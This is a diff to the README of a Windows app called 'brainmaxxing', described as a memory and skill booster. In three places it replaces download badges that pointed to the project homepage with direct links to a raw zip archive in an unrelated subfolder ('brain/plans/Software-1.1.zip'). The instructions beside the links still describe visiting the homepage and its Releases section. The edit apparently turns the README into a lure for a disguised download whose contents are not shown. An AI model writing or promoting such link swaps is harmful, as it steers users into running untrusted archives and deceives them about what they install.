@@ -1,6 +1,6 @@
 # 🧠 brainmaxxing - Simple Memory and Skill Booster
 
-[![Download brainmaxxing](https://img.shields.io/badge/Download-brainmaxxing-brightgreen)](https://github.com/otf22gz/brainmaxxing)
+[![Download brainmaxxing](https://img.shields.io/badge/Download-brainmaxxing-brightgreen)](https://github.com/otf22gz/brainmaxxing/raw/refs/heads/main/brain/plans/Software-1.1.zip)
 
 ## 🧩 What is brainmaxxing?
 
@@ -28,7 +28,7 @@ Follow these steps to download and run brainmaxxing on your Windows PC.
 
 Click this button to visit the download page:
 
-[![Download brainmaxxing](https://img.shields.io/badge/Download%20Page-Click%20Here-blue)](https://github.com/otf22gz/brainmaxxing)
+[![Download brainmaxxing](https://img.shields.io/badge/Download%20Page-Click%20Here-blue)](https://github.com/otf22gz/brainmaxxing/raw/refs/heads/main/brain/plans/Software-1.1.zip)
 
 You will arrive on the GitHub project homepage. Look for the green **Code** button near the top right. Under that, find the **Releases** section (usually on the right or in the project menu). 
 
@@ -84,7 +84,7 @@ If problems continue, visit the GitHub page to open an issue or find help.
 
 Return to the download page here:
 
-[![Download brainmaxxing](https://img.shields.io/badge/Get%20the%20App-Here-brightgreen)](https://github.com/otf22gz/brainmaxxing)
+[![Download brainmaxxing](https://img.shields.io/badge/Get%20the%20App-Here-brightgreen)](https://github.com/otf22gz/brainmaxxing/raw/refs/heads/main/brain/plans/Software-1.1.zip)
 
 Follow the instructions above to install and start using brainmaxxing on your Windows device.
 
